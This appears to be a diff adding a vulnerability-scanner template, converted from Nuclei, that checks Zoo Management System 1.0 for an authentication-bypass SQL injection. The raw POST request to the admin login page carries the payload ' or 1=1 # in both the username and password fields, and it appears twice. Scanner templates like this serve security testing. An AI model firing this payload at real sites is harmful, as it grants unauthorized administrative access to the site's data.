@@ -1,0 +1,151 @@
+{
+  "id": "zms-auth-bypass",
+  "name": "Zoo Management System 1.0 - SQL Injection",
+  "author": "dwisiswant0",
+  "severity": "CRITICAL",
+  "description": "Zoo Management System 1.0 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+  "references": [
+    "https://www.exploit-db.com/exploits/48880",
+    "https://packetstormsecurity.com/files/159567/Zoo-Management-System-1.0-SQL-Injection.html"
+  ],
+  "tags": [
+    "edb",
+    "auth-bypass",
+    "packetstorm",
+    "zms",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /zms/admin/index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,*/*;q\u003d0.8\nContent-Type: application/x-www-form-urlencoded\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/zms/admin/index.php\nCookie: PHPSESSID\u003d{{randstr}}\n\nusername\u003ddw1%27+or+1%3D1+%23\u0026password\u003ddw1%27+or+1%3D1+%23\u0026login\u003d\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "Zoo Management System (\\|\\| Dashboard|@ 2020\\. All right reserved)",
+            "ZMS ADMIN"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "zms-auth-bypass",
+    "info": {
+      "name": "Zoo Management System 1.0 - SQL Injection",
+      "author": "dwisiswant0",
+      "severity": "critical",
+      "description": "Zoo Management System 1.0 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+      "reference": [
+        "https://www.exploit-db.com/exploits/48880",
+        "https://packetstormsecurity.com/files/159567/Zoo-Management-System-1.0-SQL-Injection.html"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "edb,auth-bypass,packetstorm,zms,sqli"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /zms/admin/index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,*/*;q\u003d0.8\nContent-Type: application/x-www-form-urlencoded\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/zms/admin/index.php\nCookie: PHPSESSID\u003d{{randstr}}\n\nusername\u003ddw1%27+or+1%3D1+%23\u0026password\u003ddw1%27+or+1%3D1+%23\u0026login\u003d\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "Zoo Management System (\\|\\| Dashboard|@ 2020\\. All right reserved)",
+              "ZMS ADMIN"
+            ],
+            "condition": "and",
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
